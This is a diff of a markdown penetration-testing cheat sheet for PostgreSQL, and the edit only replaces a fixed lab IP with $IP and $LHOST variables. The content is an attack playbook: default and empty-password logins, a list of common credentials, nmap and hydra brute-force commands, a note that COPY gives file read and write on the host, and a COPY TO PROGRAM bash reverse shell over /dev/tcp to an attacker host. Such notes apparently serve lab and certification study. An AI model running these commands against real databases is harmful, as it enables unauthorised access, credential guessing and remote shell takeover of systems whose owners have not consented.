@@ -1,14 +1,14 @@
 # PostgreSQL (5432)
 
 !!! tip "Start here"
-    Try connecting as `postgres` with no password: `psql -h 10.10.10.10 -U postgres`. Many installs use `postgres:postgres` or trust authentication for local-equivalent connections. If you get in, check if `COPY` is available, it gives you file read and write on the host OS.
+    Try connecting as `postgres` with no password: `psql -h $IP -U postgres`. Many installs use `postgres:postgres` or trust authentication for local-equivalent connections. If you get in, check if `COPY` is available, it gives you file read and write on the host OS.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 5432 --script pgsql-brute 10.10.10.10
+nmap -p 5432 --script pgsql-brute $IP
 ```
 
 ---
@@ -16,8 +16,8 @@ nmap -p 5432 --script pgsql-brute 10.10.10.10
 ## Authentication
 
 ```bash
-psql -h 10.10.10.10 -U postgres
-psql -h 10.10.10.10 -U postgres -W
+psql -h $IP -U postgres
+psql -h $IP -U postgres -W
 ```
 
 Common credentials: `postgres:postgres`, `postgres:admin`, `admin:admin`
@@ -27,7 +27,7 @@ Common credentials: `postgres:postgres`, `postgres:admin`, `admin:admin`
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P passwords.txt postgres://10.10.10.10
+hydra -L users.txt -P passwords.txt postgres://$IP
 ```
 
 ---
@@ -76,7 +76,7 @@ SELECT * FROM tmp;
 Reverse shell:
 
 ```sql
-COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1"';
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/9001 0>&1"';
 ```
 
 ---
